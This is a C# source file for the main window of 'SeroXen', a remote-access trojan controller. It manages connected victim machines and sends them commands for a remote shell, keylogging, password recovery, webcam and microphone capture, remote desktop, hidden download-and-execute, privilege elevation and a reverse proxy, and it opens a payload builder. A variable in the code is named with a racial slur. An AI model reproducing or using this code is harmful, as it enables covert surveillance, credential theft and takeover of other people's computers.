﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Commands;
using xServer.Core.Cryptography;
using xServer.Core.Data;
using xServer.Core.Extensions;
using xServer.Enums;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Networking.Utilities;
using xServer.Core.Utilities;
using System.Drawing;
using System.Diagnostics.Eventing.Reader;
using Guna.UI2.WinForms;



namespace xServer.Forms
{
    public partial class FrmMain : Form
    {


        bool nigga = false;
        public SeroXenServer ListenServer { get; set; }
        public static FrmMain Instance { get; private set; }

        private const int STATUS_ID = 4;
        private const int USERSTATUS_ID = 5;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object();

        private void ShowTermsOfService()
        {
            using (var frm = new FrmTermsOfUse())
            {
                frm.ShowDialog();
            }
            Thread.Sleep(300);
        }
        public TabPage tabPage;
        public FrmMain()
        {
            Instance = this;
            InitializeComponent();


            using (FrmLogin frmLogin = new FrmLogin())
            {
                frmLogin.FormClosed += FrmLogin_FormClosed;
                if (frmLogin.ShowDialog() != DialogResult.OK)
                {
                    this.DialogResult = DialogResult.Cancel;
                }
            }
        }

        private void FrmLogin_FormClosed(object sender, FormClosedEventArgs e)
        {
            FrmLogin frmLogin = sender as FrmLogin;
            if (frmLogin != null && frmLogin.DialogResult != DialogResult.OK)
            {
                Application.Exit();
            }
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("SeroXen | v3.1.5 | - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("SeroXen | v3.1.5 | - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            ListenServer = new SeroXenServer();

            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen && Settings.UseUPnP)
            {
                UPnP.Initialize(Settings.ListenPort);
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support);
            }
            else if (Settings.AutoListen)
            {
                UPnP.Initialize();
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support);
            }
            else
            {
                UPnP.Initialize();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();
            AutostartListening();
            this.MinimumSize = this.MaximumSize = this.Size;
        }
        void FrmClosedHandler(object sender, FormClosedEventArgs e)
        {
            guna2TabControl1.SelectedIndex = 0;
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UPnP.DeletePortMap(Settings.ListenPort);
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
            Instance = null;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (!listening)
                        lstClients.Items.Clear();
                    label3.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            UpdateClientStatusInListview(client.Key, false);
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="client">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="client">The client to add.</param>
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        ListViewItem existingItem = lstClients.Items.Cast<ListViewItem>()
                            .FirstOrDefault(item => item != null && client.Equals(item.Tag));

                        if (existingItem != null)
                        {
                            existingItem.SubItems[4].Text = "Online";
                            existingItem.SubItems[4].ForeColor = Color.Green;

                            if (existingItem.SubItems[5].Text == "Offline")
                            {
                                lstClients.Items.Remove(existingItem);
                            }
                        }
                        else
                        {
                            bool hasSameDesktopData = lstClients.Items.Cast<ListViewItem>()
                                .Any(item => item.SubItems[2].Text == client.Value.UserAtPc);

                            if (hasSameDesktopData)
                            {
                                ListViewItem oldOfflineItem = lstClients.Items.Cast<ListViewItem>()
                                    .FirstOrDefault(item => item.SubItems[2].Text == client.Value.UserAtPc && item.SubItems[4].Text == "Offline");

                                if (oldOfflineItem != null)
                                {
                                    lstClients.Items.Remove(oldOfflineItem);
                                }
                            }

                            var lvi = new ListViewItem(new[] {
                        client.EndPoint.Address.ToString(),
                        client.Value.Tag,
                        client.Value.UserAtPc,
                        client.Value.Version,
                        "Online",
                        "Active",
                        client.Value.CountryWithCode,
                        client.Value.OperatingSystem,
                        client.Value.AccountType,
                       "Offline",
                    });

                            lvi.Tag = client;

                            lvi.UseItemStyleForSubItems = false;

                            if (client.Value.Version != "3.1.5")
                            {
                                lvi.SubItems[3].ForeColor = Color.Red;
                                lvi.SubItems[4].ForeColor = Color.Red;
                            }
                            else
                            {
                                lvi.SubItems[3].ForeColor = Color.Green;
                                lvi.SubItems[4].ForeColor = Color.Green;
                            }

                            lvi.ImageIndex = client.Value.ImageIndex;
                            lstClients.Items.Add(lvi);
                        }
                    }
                });

                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Removes a connected client from the Listview.
        /// </summary>
        /// <param name="client">The client to remove.</param>
        private void UpdateClientStatusInListview(Client client, bool isConnected)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            if (isConnected)
                            {
                                lvi.SubItems[4].Text = "Online";
                                lvi.SubItems[4].ForeColor = Color.Green;
                            }
                            else
                            {
                                lvi.SubItems[4].Text = "Offline";
                                lvi.SubItems[4].ForeColor = Color.Red;
                            }
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }


        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="client">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        public void SetStatusByClient(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.SubItems[STATUS_ID].Text = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <param name="client">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        public void SetUserStatusByClient(Client client, UserStatus userStatus)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="client">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker)delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of all selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Gets all connected clients.
        /// </summary>
        /// <returns>An array of all connected Clients.</returns>
        private Client[] GetConnectedClients()
        {
            return ListenServer.ConnectedClients;
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;

                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Connection"

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        if (Core.Data.Update.UseDownload)
                        {
                            foreach (Client c in GetSelectedClients())
                            {
                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Data.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                            }
                        }
                        else
                        {
                            new Thread(() =>
                            {
                                bool error = false;
                                foreach (Client c in GetSelectedClients())
                                {
                                    if (c == null) continue;
                                    if (error) continue;

                                    FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
                                    if (srcFile.MaxBlocks < 0)
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }

                                    int id = FileHelper.GetNewTransferId();

                                    CommandHandler.HandleSetStatus(c,
                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                    {
                                        byte[] block;
                                        if (!srcFile.ReadBlock(currentBlock, out block))
                                        {
                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            error = true;
                                            break;
                                        }
                                        new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, string.Empty, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                    }
                                }
                            }).Start();
                        }
                    }
                }
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoClientReconnect().Execute(c);
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoClientDisconnect().Execute(c);
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    new Core.Packets.ServerPackets.DoClientUninstall().Execute(c);
                }
            }
        }

        #endregion

        #region "System"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmSi != null)
                {
                    c.Value.FrmSi.Focus();
                    return;
                }
                FrmSystemInformation frmSI = new FrmSystemInformation(c);
                frmSI.Show();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmFm != null)
                {
                    c.Value.FrmFm.Focus();
                    return;
                }
                FrmFileManager frmFM = new FrmFileManager(c);
                frmFM.Show();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmStm != null)
                {
                    c.Value.FrmStm.Focus();
                    return;
                }
                FrmStartupManager frmStm = new FrmStartupManager(c);
                frmStm.Show();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmTm != null)
                {
                    c.Value.FrmTm.Focus();
                    return;
                }
                FrmTaskManager frmTM = new FrmTaskManager(c);
                frmTM.Show();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRs != null)
                {
                    c.Value.FrmRs.Focus();
                    return;
                }
                FrmRemoteShell frmRS = new FrmRemoteShell(c);
                frmRS.Show();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmCon != null)
                {
                    c.Value.FrmCon.Focus();
                    return;
                }

                FrmConnections frmCON = new FrmConnections(c);
                frmCON.Show();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmProxy != null)
                {
                    c.Value.FrmProxy.Focus();
                    return;
                }

                FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                frmRS.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    if (c.Value.FrmRe != null)
                    {
                        c.Value.FrmRe.Focus();
                        return;
                    }

                    FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
                    frmRE.Show();
                }
            }
        }

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoAskElevate().Execute(c);
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Shutdown).Execute(c);
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Restart).Execute(c);
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Standby).Execute(c);
            }
        }

        #endregion

        #region "Surveillance"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRdp != null)
                {
                    c.Value.FrmRdp.Focus();
                    return;
                }
                FrmRemoteDesktop frmRDP = new FrmRemoteDesktop(c);
                frmRDP.Show();
            }
        }
        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmWebcam != null)
                {
                    c.Value.FrmWebcam.Focus();
                    return;
                }
                FrmRemoteWebcam frmWebcam = new FrmRemoteWebcam(c);
                frmWebcam.Show();
            }
        }
        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmPass != null)
                {
                    c.Value.FrmPass.Focus();
                    return;
                }

                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients());
                frmPass.Show();
            }
        }


        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmKl != null)
                {
                    c.Value.FrmKl.Focus();
                    return;
                }
                FrmKeylogger frmKL = new FrmKeylogger(c);
                frmKL.Show();
            }
        }

        private void remoteMicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmMic != null)
                {
                    c.Value.FrmMic.Focus();
                    return;
                }
                FrmMicrophone frmMic = new FrmMicrophone(c);
                frmMic.Show();
            }
        }

        #endregion

        #region "Miscellaneous"

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                {
                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
                    {
                        new Thread(() =>
                        {
                            bool error = false;
                            foreach (Client c in GetSelectedClients())
                            {
                                if (c == null) continue;
                                if (error) continue;

                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
                                if (srcFile.MaxBlocks < 0)
                                {
                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                        "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    error = true;
                                    break;
                                }

                                int id = FileHelper.GetNewTransferId();

                                CommandHandler.HandleSetStatus(c,
                                    new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                {
                                    byte[] block;
                                    if (srcFile.ReadBlock(currentBlock, out block))
                                    {
                                        new Core.Packets.ServerPackets.DoUploadAndExecute(id,
                                            Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                            currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                    }
                                    else
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }
                                }
                            }
                        }).Start();
                    }
                }
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.DoDownloadAndExecute(DownloadAndExecute.URL,
                                DownloadAndExecute.RunHidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.DoVisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.DoShowMessageBox(
                                Messagebox.Caption, Messagebox.Text, Messagebox.Button, Messagebox.Icon).Execute(c);
                        }
                    }
                }
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }


        #endregion

        private void tableLayoutPanel_Paint(object sender, PaintEventArgs e)
        {

        }






        private void tableLayoutPanel_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }
        /*    
            private void ToolStripMenuItem_Click(object sender, EventArgs e)
            {
                {
                    if (lstClients.SelectedItems.Count != 0)
                    {
                        using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                        {
                            if (frm.ShowDialog() == DialogResult.OK)
                            {
                                if (Core.Data.Update.UseDownload)
                                {
                                    foreach (Client c in GetSelectedClients())
                                    {
                                        new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Data.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                                    }
                                }
                                else
                                {
                                    new Thread(() =>
                                    {
                                        bool error = false;
                                        foreach (Client c in GetSelectedClients())
                                        {
                                            if (c == null) continue;
                                            if (error) continue;

                                            FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
                                            if (srcFile.MaxBlocks < 0)
                                            {
                                                MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                    "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                                error = true;
                                                break;
                                            }

                                            int id = FileHelper.GetNewTransferId();

                                            CommandHandler.HandleSetStatus(c,
                                                new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                            for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                            {
                                                byte[] block;
                                                if (!srcFile.ReadBlock(currentBlock, out block))
                                                {
                                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                        "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                                    error = true;
                                                    break;
                                                }
                                                new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, string.Empty, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                            }
                                        }
                                    }).Start();
                                }
                            }
                        }
                    }
                }
            }
            */



        private void guna2Button3_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            switch (guna2TabControl1.SelectedIndex)
            {
                case 0:
                    break;
                case 1:
                    using (var frm = new FrmBuilder())
                    {
                        frm.FormClosed += FrmClosedHandler;
                        if (!IsFormOpen<FrmBuilder>())
                        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
                            frm.ShowDialog();
                        }
#endif
                    }
                    break;
                case 2:
                    using (var frm = new FrmAbout())
                    {
                        frm.FormClosed += FrmClosedHandler;
                        if (!IsFormOpen<FrmAbout>())
                        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
                            frm.ShowDialog();
                        }
#endif
                    }
                    break;
                case 3:
                    if (!IsFormOpen<FrmUpdate>())
                    {
                        if (lstClients.SelectedItems.Count != 0)
                        {
                            using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                            {
                                frm.FormClosed += FrmClosedHandler;
                                if (frm.ShowDialog() == DialogResult.OK)
                                {
                                    if (Core.Data.Update.UseDownload)
                                    {
                                        foreach (Client c in GetSelectedClients())
                                        {
                                            new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Data.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                                        }
                                    }
                                    else
                                    {
                                        new Thread(() =>
                                        {
                                            bool error = false;
                                            foreach (Client c in GetSelectedClients())
                                            {
                                                if (c == null) continue;
                                                if (error) continue;

                                                FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
                                                if (srcFile.MaxBlocks < 0)
                                                {
                                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                        "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                                    error = true;
                                                    break;
                                                }

                                                int id = FileHelper.GetNewTransferId();

                                                CommandHandler.HandleSetStatus(c,
                                                    new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                                {
                                                    byte[] block;
                                                    if (!srcFile.ReadBlock(currentBlock, out block))
                                                    {
                                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                                        error = true;
                                                        break;
                                                    }
                                                    new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, string.Empty, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                                }
                                            }
                                        }).Start();
                                    }
                                }
                            }
                        }
                    }
                    break;
                case 4:
                    if (!nigga)
                    {
                        nigga = true;
                        DialogResult result = MessageBox.Show("Leave SeroXen?", "Leave?", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);

                        if (result == DialogResult.OK)
                        {
                            Application.Exit();
                        }

                        if (result == DialogResult.Cancel)
                        {
                            guna2TabControl1.SelectedIndex = 0;
                            nigga = false;
                        }
                    }

                    break;
                case 8:
                    using (var frm = new FrmSettings(ListenServer))
                    {
                        frm.FormClosed += FrmClosedHandler;
                        if (!IsFormOpen<FrmSettings>())
                        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
                            frm.ShowDialog();
                        }
#endif
                    }
                    break;
            }
        }

        private bool IsFormOpen<T>() where T : Form
        {
            return Application.OpenForms.OfType<T>().Any();
        }

        private void guna2ImageButton1_Click(object sender, EventArgs e)
        {
        }


        private void remoteHVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }


        private void miscellaneousToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
    }
}

